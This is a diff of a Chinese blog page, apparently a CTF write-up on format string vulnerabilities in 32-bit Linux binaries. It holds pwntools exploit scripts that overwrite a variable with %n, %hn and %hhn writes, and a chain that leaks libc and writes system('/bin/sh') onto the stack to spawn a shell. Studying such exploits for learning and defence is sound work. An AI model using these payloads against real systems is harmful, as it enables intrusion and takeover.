@@ -31,18 +31,18 @@
 
 <div style="font-size: 21px;"><b>步骤3：编写exp</b></div>
 
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./datajk&quot;)
-#io = remote(&quot;111.200.241.244&quot;,65079)
+io &#x3D; process(&quot;.&#x2F;datajk&quot;)
+#io &#x3D; remote(&quot;111.200.241.244&quot;,65079)
 
-key_addr = 0x0804A048
-payload = p32(key_addr) + b&#39;%35795742d&#39; + b&#39;%12$n&#39;
+key_addr &#x3D; 0x0804A048
+payload &#x3D; p32(key_addr) + b&#39;%35795742d&#39; + b&#39;%12$n&#39;
 
 io.sendline(payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>远程的话大概要几分钟输出，本地的话快一点。直接对四个字节一次性写入的exp很简单，但很粗鲁，随后讲讲怎么用h和hh标志进行改进。</p>
 <br>
 
@@ -54,24 +54,24 @@ io.interactive()
 <li>hh：以单字节的形式；</li>
 </ul>
 <p>要使key=35795746（0x0222 3322），因为程序为小端序，高字节存储在低地址。所以就是要使key_addr处为0x3322，key_addr+2处为0x0222。</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;, log_level&#x3D;&#39;debug&#39;)
 
-#io = process(&quot;./datajk&quot;)
-io = gdb.debug(&quot;./datajk&quot;)
-key_addr = 0x0804A048
+#io &#x3D; process(&quot;.&#x2F;datajk&quot;)
+io &#x3D; gdb.debug(&quot;.&#x2F;datajk&quot;)
+key_addr &#x3D; 0x0804A048
 
-#35795746 == 0x02223322
-#num1 = 0x222 0x222 == 546
-#num2 = 0x3322 0x3322 == 13090; 12544=13090-546
+#35795746 &#x3D;&#x3D; 0x02223322
+#num1 &#x3D; 0x222 0x222 &#x3D;&#x3D; 546
+#num2 &#x3D; 0x3322 0x3322 &#x3D;&#x3D; 13090; 12544&#x3D;13090-546
 
-payload = p32(key_addr) + p32(key_addr + 2)
-payload += b&#39;%0538d&#39; + b&#39;%13$hn&#39;
-payload += b&#39;%012544d&#39; + b&#39;%12$hn&#39;
+payload &#x3D; p32(key_addr) + p32(key_addr + 2)
+payload +&#x3D; b&#39;%0538d&#39; + b&#39;%13$hn&#39;
+payload +&#x3D; b&#39;%012544d&#39; + b&#39;%12$hn&#39;
 
 io.sendline(payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>注：用%n写入数据的顺序要从写入数值小的开始。</p>
 <p>前面已经输出了两个地址，占了8字节，所以0x222要减去8为538。后面的12544同理，要减去已输出的量。</p>
  <br>
@@ -82,23 +82,23 @@ io.interactive()
 <p>这时要灵活的改变‘覆盖地址’的参数位了，可以先看一下wiki中的这个页面的‘覆盖小数字’：</p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_14">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_14</a></p>
 <p>exp里面的a主要用于调参数位（按4调整）。由于这里调动比较灵活，而且代码不唯一。但大概思想不变，所以就不做多解释了。</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./datajk&quot;)
-key_addr = 0x0804A048
+io &#x3D; process(&quot;.&#x2F;datajk&quot;)
+key_addr &#x3D; 0x0804A048
 
 #0x02 22 33 22 (high -&gt; low)
 #input 0x02
-payload = b&#39;aa%15$hhnaaa&#39; + p32(key_addr + 3)
+payload &#x3D; b&#39;aa%15$hhnaaa&#39; + p32(key_addr + 3)
 #input 0x22(two)
-payload += p32(key_addr + 2) + p32(key_addr) + b&#39;%017d%16$hhn&#39; + b&#39;%17$hhna&#39;
+payload +&#x3D; p32(key_addr + 2) + p32(key_addr) + b&#39;%017d%16$hhn&#39; + b&#39;%17$hhna&#39;
 #input 0x33
-payload += p32(key_addr + 1) + b&#39;%012d%23$hhn&#39;
+payload +&#x3D; p32(key_addr + 1) + b&#39;%012d%23$hhn&#39;
 
 io.sendline(payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="0x02：深入分析"><a href="#0x02：深入分析" class="headerlink" title="0x02：深入分析"></a>0x02：深入分析</h2><p><img src="/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20221024192118747.png" alt="image-20221024192118747"></p>
@@ -129,19 +129,19 @@ io.interactive()
 <p>断在0x080485AF，查看栈空间：</p>
 <p><img src="/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20221024183310910.png" alt="image-20221024183310910"></p>
 <p>计划使用ROP控制执行流去执行<code>system(&quot;/bin.sh&quot;)</code>，那么我们需要泄露libc版本。用于存在格式化字符串漏洞，所以我们只要将puts@got的地址写在format string的上方附近，使用%s打印即可。栈地址可通过%p轻易泄露，那怎么将puts@写到栈上了？</p>
-<pre><code>0xffffd1b4 —▸ 0xffffd264 —▸ 0xffffd403 ◂— &#39;/home/tolele/studyspace/week36/login&#39;
-0xffffd1b8 —▸ 0xffffd26c —▸ 0xffffd428 ◂— &#39;SHELL=/bin/bash&#39;
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">0xffffd1b4 —▸ 0xffffd264 —▸ 0xffffd403 ◂— &#39;&#x2F;home&#x2F;tolele&#x2F;studyspace&#x2F;week36&#x2F;login&#39;
+0xffffd1b8 —▸ 0xffffd26c —▸ 0xffffd428 ◂— &#39;SHELL&#x3D;&#x2F;bin&#x2F;bash&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>我们可以选一个中介位置(fakespace)，通过栈上的这两个数据。往0xffffd264写入fakespace，0xffffd26c写入fakespace+2。栈上有了这两个地址后，就可以往fakespace处写数据了。</p>
 <br>
 
 <div style="font-size: 21px;"><b>步骤4：编写exp</b></div>
 
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./login&quot;)
-elf = ELF(&quot;./login&quot;)
+io &#x3D; process(&quot;.&#x2F;login&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;login&quot;)
 
 def debug():
     gdb.attach(io)
@@ -150,55 +150,63 @@ def debug():
 io.sendlineafter(&quot;Please input your name: &quot;, &quot;tolele&quot;)
 io.sendlineafter(&quot;Please input your password: &quot;, &quot;%6$p&quot;)
 io.recvline()
-ebp_addr = int(io.recvline()[-11:-1],16) - 0x10
-print(&quot;@@@ ebp_addr = &quot; + str(hex(ebp_addr)))
+ebp_addr &#x3D; int(io.recvline()[-11:-1],16) - 0x10
+print(&quot;@@@ ebp_addr &#x3D; &quot; + str(hex(ebp_addr)))
 
 # leak libc version
 def fmt_func(addr, data):
-    data_high = (data&amp;0xffff)
-    data_low = (data&amp;0xffff0000)&gt;&gt;16
-    high_addr = (addr&amp;0xffff) + 2
-    low_addr = high_addr - 2
+    data_high &#x3D; (data&amp;0xffff)
+    data_low &#x3D; (data&amp;0xffff0000)&gt;&gt;16
+    high_addr &#x3D; (addr&amp;0xffff) + 2
+    low_addr &#x3D; high_addr - 2
     #io.sendlineafter(&quot;Please input your password: &quot;, &#39;%&#39;+str(low_addr)+&#39;c&#39;+&#39;%21$hn&#39;)
-    payload1 = &#39;%&#39;+str(low_addr)+&#39;d&#39;+&#39;%21$hn&#39;
+    payload1 &#x3D; &#39;%&#39;+str(low_addr)+&#39;d&#39;+&#39;%21$hn&#39;
     io.sendline(payload1)
     io.recvuntil(&quot;Try again!&quot;)
     #io.sendlineafter(&quot;Please input your password: &quot;, &#39;%&#39;+str(high_addr)+&#39;c&#39;+&#39;%22$hn&#39;)
-    payload2 = &#39;%&#39;+str(high_addr)+&#39;d&#39;+&#39;%22$hn&#39;
+    payload2 &#x3D; &#39;%&#39;+str(high_addr)+&#39;d&#39;+&#39;%22$hn&#39;
     io.sendline(payload2)
     io.recvuntil(&quot;Try again!&quot;)
     #io.sendlineafter(&quot;Please input your password: &quot;, &quot;%&quot;+str(data_high)+&quot;c&quot;+&quot;%65$hn&quot;)
-    payload3 = &quot;%&quot;+str(data_high)+&quot;d&quot;+&quot;%65$hn&quot;
+    payload3 &#x3D; &quot;%&quot;+str(data_high)+&quot;d&quot;+&quot;%65$hn&quot;
     io.sendline(payload3)
     io.recvuntil(&quot;Try again!&quot;)
     #io.sendlineafter(&quot;Please input your password: &quot;, &quot;%&quot;+str(data_low)+&quot;c&quot;+&quot;%67$hn&quot;)
-    payload4 = &quot;%&quot;+str(data_low)+&quot;d&quot;+&quot;%67$hn&quot;
+    payload4 &#x3D; &quot;%&quot;+str(data_low)+&quot;d&quot;+&quot;%67$hn&quot;
     io.sendline(payload4)
     io.recvuntil(&quot;Try again!&quot;)
 
-puts_got = elf.got[&#39;puts&#39;]
-fakeaddr = ebp_addr + 0x10
+puts_got &#x3D; elf.got[&#39;puts&#39;]
+fakeaddr &#x3D; ebp_addr + 0x10
 fmt_func(fakeaddr, elf.got[&#39;puts&#39;])
 io.sendline(&quot;%10$s&quot;)
-puts_addr = u32(io.recvuntil(b&#39;\xf7&#39;)[-4:].ljust(4,b&#39;\x00&#39;))
-print(&quot;@@@ puts_addr = &quot;+str(hex(puts_addr)))
+puts_addr &#x3D; u32(io.recvuntil(b&#39;\xf7&#39;)[-4:].ljust(4,b&#39;\x00&#39;))
+print(&quot;@@@ puts_addr &#x3D; &quot;+str(hex(puts_addr)))
 
-libc = ELF(&quot;./libc.so.6&quot;)
-sys_libc = libc.sym[&#39;system&#39;]
-puts_libc = libc.sym[&#39;puts&#39;]
-binsh_libc = libc.search(b&#39;/bin/sh&#39;).__next__()
+libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)
+sys_libc &#x3D; libc.sym[&#39;system&#39;]
+puts_libc &#x3D; libc.sym[&#39;puts&#39;]
+binsh_libc &#x3D; libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()
 
-sys_addr = puts_addr - puts_libc + sys_libc
-binsh_addr = puts_addr - puts_libc + binsh_libc
+sys_addr &#x3D; puts_addr - puts_libc + sys_libc
+binsh_addr &#x3D; puts_addr - puts_libc + binsh_libc
 fmt_func(ebp_addr + 0x4, sys_addr)
 fmt_func(ebp_addr + 0xc, binsh_addr)
 # debug()
 io.sendline(&quot;wllmmllw&quot;)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>fmt_func里面使用的sendlineafter写入时，发生了一些报错，改成随后的两个语句后就可以了，暂时找不到原因，先留着注释。</p>
 <p>题目时没有libc的，但是泄露本机的libc后，查询不到相应的版本，可能是因为版本比较新的原因，所以我就直接找本机的libc文件进行代替了。</p>
-<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 gtag('config', '');</script></html>
